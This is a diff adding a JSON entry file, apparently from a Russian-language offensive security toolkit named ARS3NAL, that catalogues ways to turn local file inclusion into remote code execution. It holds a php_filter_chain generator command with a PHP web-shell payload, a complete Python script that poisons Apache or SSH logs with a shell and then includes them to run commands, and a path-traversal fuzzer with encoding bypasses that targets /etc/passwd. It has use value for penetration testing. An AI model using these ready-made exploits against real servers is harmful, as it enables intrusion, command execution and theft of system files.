@@ -1,0 +1,60 @@
+{
+  "category": "LFI / Path Traversal → RCE",
+  "group": "exploit",
+  "catOrder": 12,
+  "entries": [
+    {
+      "title": "php_filter_chain LFI→RCE (ссылка на synacktiv, без upload)",
+      "lang": "bash",
+      "tags": [
+        "lfi",
+        "rce",
+        "php",
+        "filter-chain"
+      ],
+      "rating": "must",
+      "deps": "внешний инструмент: github.com/synacktiv/php_filter_chain_generator",
+      "placeholders": "{{URL}} (include-параметр) · {{CMD}}",
+      "badges": [],
+      "source": "https://github.com/synacktiv/php_filter_chain_generator",
+      "license": "ССЫЛКА (upstream без лицензии — не вендорится)",
+      "body": "Карточка-ССЫЛКА (код НЕ вендорим). php-filter-chain - техника превращения LFI в RCE БЕЗ загрузки файла: цепочка php://filter-конвертеров (iconv) нанизывается так, что побайтово \"выращивает\" нужные ASCII-символы в начале потока, в итоге собирая полноценный PHP-код прямо из `php://filter/...` ресурса, который потом `include`-ится. Берётся, когда есть `include($_GET['file'])` под управлением, парсер - PHP, но нет ни одного места, куда можно залить файл (нет логов, нет upload, нет /proc/self/environ). Генератор от synacktiv собирает эту длиннющую цепочку фильтров автоматически.\n\n> Лицензия: у репозитория synacktiv НЕТ файла LICENSE (all-rights-reserved), поэтому в ARS3NAL (GPL-3.0) код НЕ копируется. Запусти оригинальный генератор по ссылке. Идея алгоритма публична в докладе synacktiv \"Pass-the-Salt 2022\" / их блоге - при желании реализуется самостоятельно.\n\nИдея в двух словах:\n- база - конвертер `convert.iconv.UTF8.CSISO2022KR` (и подобные), которые добавляют префиксные байты к потоку;\n- цепляя десятки таких фильтров, ты по одному символу формируешь начало строки так, чтобы оно стало валидным `<?php ... ?>`;\n- финальный `convert.base64-decode` приводит накопленное к нужному коду;\n- результат скармливается уязвимому `include`, PHP исполняет собранный payload.\n\n```text\n# НЕ вендорится. Использовать оригинальный генератор:\n#   https://github.com/synacktiv/php_filter_chain_generator\n#\n# Типовой вызов upstream-инструмента:\npython3 php_filter_chain_generator.py --chain '<?php system($_GET[\"c\"]); ?>'\n# -> печатает строку вида:\n#   php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp\n# подставляешь её в уязвимый параметр include:\n#   GET /index.php?file=php://filter/convert.iconv...resource=php://temp&c=id\n```\n\nЗапуск:\n```bash\n# 1) склонируй апстрим (внешний инструмент, не часть ARS3NAL)\ngit clone https://github.com/synacktiv/php_filter_chain_generator\npython3 php_filter_chain_generator/php_filter_chain_generator.py \\\n        --chain '<?php system($_GET[\"c\"]); ?>'\n# 2) полученную php://filter-цепочку подставь в LFI-параметр + добавь &c=<команда>\n```"
+    },
+    {
+      "title": "LFI log poisoning → RCE (Apache access.log / SSH auth.log)",
+      "lang": "python",
+      "tags": [
+        "lfi",
+        "rce",
+        "log-poisoning",
+        "php"
+      ],
+      "rating": "must",
+      "deps": "pip install requests · ssh (для режима ssh)",
+      "placeholders": "{{LFI_URL}} (* = файл) · {{CMD}} · {{LOGPATH}}",
+      "badges": [],
+      "source": "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "LFI -> RCE через отравление логов (log poisoning). Если уязвимый `include`/`require` умеет читать локальные файлы, а ты можешь дотянуться до файла лога, в который попадает контролируемая тобой строка, - впрыскиваешь PHP-код в лог и затем инклудишь сам лог. Скрипт делает обе фазы: (1) шлёт запрос с PHP-payload в подходящем поле (User-Agent для Apache access.log, либо имя пользователя для SSH auth.log), (2) инклудит лог через LFI с параметром команды. Берётся, когда есть LFI на PHP и читаемый путь к логам.\n\n> Apache: payload кладём в `User-Agent`, путь обычно `/var/log/apache2/access.log` или `/var/log/httpd/access_log`. SSH: payload в имя логина (`ssh '<?php ...?>'@host`), путь `/var/log/auth.log` - но логин-инъекция требует доступа к SSH-порту и часто шумит/обрезается.\n\n```python\n#!/usr/bin/env python3\n# lfi_log_poison.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Turn an LFI into RCE by poisoning a readable log file with PHP, then including it.\nimport argparse, subprocess, requests\nrequests.packages.urllib3.disable_warnings()\n\nAPACHE_LOGS = [\"/var/log/apache2/access.log\", \"/var/log/httpd/access_log\",\n               \"/var/log/nginx/access.log\", \"/var/log/apache2/error.log\"]\n\ndef poison_apache(s, base):\n    # the PHP payload lands in the access log via the User-Agent header\n    php = \"<?php if(isset($_GET['c'])){system($_GET['c']);} ?>\"\n    try:\n        s.get(base, headers={\"User-Agent\": php}, verify=False, timeout=15)\n        print(\"[*] poisoned access log via User-Agent\")\n    except requests.RequestException as e:\n        print(f\"[!] poison request failed: {e}\")\n\ndef poison_ssh(host, port):\n    php = \"<?php if(isset($_GET['c'])){system($_GET['c']);} ?>\"\n    print(\"[*] attempting SSH log poison (login will fail; that is expected)\")\n    subprocess.run([\"ssh\", \"-p\", str(port), \"-o\", \"StrictHostKeyChecking=no\",\n                    \"-o\", \"ConnectTimeout=5\", f\"{php}@{host}\"],\n                   input=b\"\\n\", timeout=15, capture_output=True)\n\ndef trigger(s, lfi, logpath, cmd):\n    # include the poisoned log through the LFI param and pass the command\n    url = lfi.replace(\"*\", logpath) if \"*\" in lfi else lfi + requests.utils.quote(logpath)\n    sep = \"&\" if \"?\" in url else \"?\"\n    full = f\"{url}{sep}c={requests.utils.quote(cmd)}\"\n    try:\n        r = s.get(full, verify=False, timeout=20)\n        return r.text\n    except requests.RequestException as e:\n        return f\"[!] {e}\"\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL LFI log-poison -> RCE\")\n    ap.add_argument(\"-l\", \"--lfi\", required=True, help=\"LFI URL, * marks the file param\")\n    ap.add_argument(\"--base\", help=\"base URL to hit for Apache poisoning (default = LFI host)\")\n    ap.add_argument(\"--mode\", choices=[\"apache\", \"ssh\"], default=\"apache\")\n    ap.add_argument(\"--logpath\", help=\"log file to include (default: try common Apache paths)\")\n    ap.add_argument(\"--ssh-host\"); ap.add_argument(\"--ssh-port\", type=int, default=22)\n    ap.add_argument(\"-c\", \"--cmd\", default=\"id\")\n    a = ap.parse_args()\n    s = requests.Session(); s.headers.setdefault(\"Accept\", \"*/*\")\n    if a.mode == \"apache\":\n        poison_apache(s, a.base or a.lfi.split(\"?\")[0])\n        logs = [a.logpath] if a.logpath else APACHE_LOGS\n    else:\n        poison_ssh(a.ssh_host, a.ssh_port)\n        logs = [a.logpath or \"/var/log/auth.log\"]\n    for log in logs:\n        print(f\"[*] including {log} ...\")\n        out = trigger(s, a.lfi, log, a.cmd)\n        if out and \"[!]\" not in out[:4]:\n            print(out[:1000]); print(f\"[=] try this log if output looks like code: {log}\")\n            break\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\n# Apache access.log через User-Agent:\npython3 lfi_log_poison.py -l \"http://target/?page=*\" --mode apache -c \"id\"\n# с явным путём лога:\npython3 lfi_log_poison.py -l \"http://target/?page=*\" --logpath /var/log/apache2/access.log -c \"uname -a\"\n```"
+    },
+    {
+      "title": "Path traversal fuzzer (depth × encoding matrix)",
+      "lang": "python",
+      "tags": [
+        "lfi",
+        "traversal",
+        "fuzzer",
+        "bypass"
+      ],
+      "rating": "must",
+      "deps": "pip install requests",
+      "placeholders": "{{URL}} (* = path-параметр) · {{TARGET_FILE}} · {{MARKER}}",
+      "badges": [
+        "legacy"
+      ],
+      "source": "https://owasp.org/www-community/attacks/Path_Traversal",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Фаззер path traversal: перебирает матрицу глубина x кодировка, чтобы пробить фильтры на `../`. Для каждой глубины (`../` x N) применяет разные обходы: plain, url-encode, double-url, `....//` (схлопывание после strip), `..;/` (трюк с path-параметром в Tomcat/Spring), overlong-UTF8 (`%c0%ae`), и null-byte (`%00`). Сравнивает ответ с базлайном и ищет маркер успешного чтения (по умолчанию `root:` из `/etc/passwd`). Берётся для поиска точки LFI/traversal, когда наивный `../../../etc/passwd` режется WAF или нормализатором.\n\n> null-byte (`%00`) - LEGACY: обрезает расширение, добавляемое приложением (`page.php`), работает только на PHP < 5.3.4 и старом коде. Оставлен в матрице для старых целей/CTF. `..;/` и overlong-UTF8 - против конкретных серверов (Tomcat / старый IIS), не универсальны.\n\n```python\n#!/usr/bin/env python3\n# traversal_fuzzer.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\n# Fuzz path traversal as a depth x encoding matrix and flag file reads.\nimport argparse, requests\nrequests.packages.urllib3.disable_warnings()\n\n# each builder takes depth N and the target file, returns a candidate path string\nENCODINGS = {\n    \"plain\":        lambda n, f: \"../\" * n + f,\n    \"url\":          lambda n, f: \"%2e%2e%2f\" * n + f,\n    \"double_url\":   lambda n, f: \"%252e%252e%252f\" * n + f,\n    \"dotdotslash\":  lambda n, f: \"....//\" * n + f,            # collapses after a single strip\n    \"semicolon\":    lambda n, f: \"..;/\" * n + f,              # Tomcat/Spring path-param trick\n    \"overlong\":     lambda n, f: \"%c0%ae%c0%ae/\" * n + f,     # overlong UTF-8 of '.'\n    \"backslash\":    lambda n, f: \"..\\\\\" * n + f,              # Windows / some normalizers\n    \"nullbyte\":     lambda n, f: \"../\" * n + f + \"%00\",       # LEGACY: PHP<5.3.4 ext-strip\n}\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL path-traversal fuzzer (depth x encoding)\")\n    ap.add_argument(\"-u\", \"--url\", required=True, help=\"URL with * at the path param\")\n    ap.add_argument(\"-f\", \"--file\", default=\"etc/passwd\", help=\"target file (no leading slash)\")\n    ap.add_argument(\"-m\", \"--marker\", default=\"root:\", help=\"substring proving a successful read\")\n    ap.add_argument(\"--max-depth\", type=int, default=10)\n    ap.add_argument(\"-c\", \"--cookie\", default=\"\")\n    ap.add_argument(\"--prefix\", default=\"\", help=\"extra prefix, e.g. /var/www/html/\")\n    a = ap.parse_args()\n    s = requests.Session(); s.headers[\"User-Agent\"] = \"ARS3NAL-LFI/1.0\"\n    ck = dict(c.split(\"=\", 1) for c in a.cookie.split(\";\") if \"=\" in c) if a.cookie else None\n    hits = []\n    for name, build in ENCODINGS.items():\n        for depth in range(1, a.max_depth + 1):\n            payload = a.prefix + build(depth, a.file)\n            url = a.url.replace(\"*\", payload)\n            try:\n                r = s.get(url, cookies=ck, verify=False, timeout=15)\n            except requests.RequestException:\n                continue\n            if a.marker in r.text:\n                tag = \" [LEGACY]\" if name == \"nullbyte\" else \"\"\n                print(f\"[+] HIT  enc={name:11} depth={depth:<2} -> {payload}{tag}\")\n                hits.append((name, depth, payload))\n                break  # first working depth per encoding is enough\n    if not hits:\n        print(\"[-] no traversal found; try other --file, --prefix, or a deeper --max-depth\")\n    else:\n        print(f\"\\n[=] {len(hits)} working vector(s)\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 traversal_fuzzer.py -u \"http://target/?file=*\" -f etc/passwd\n# Windows-цель:\npython3 traversal_fuzzer.py -u \"http://target/?file=*\" -f \"windows/win.ini\" -m \"for 16-bit\"\n```"
+    }
+  ]
+}
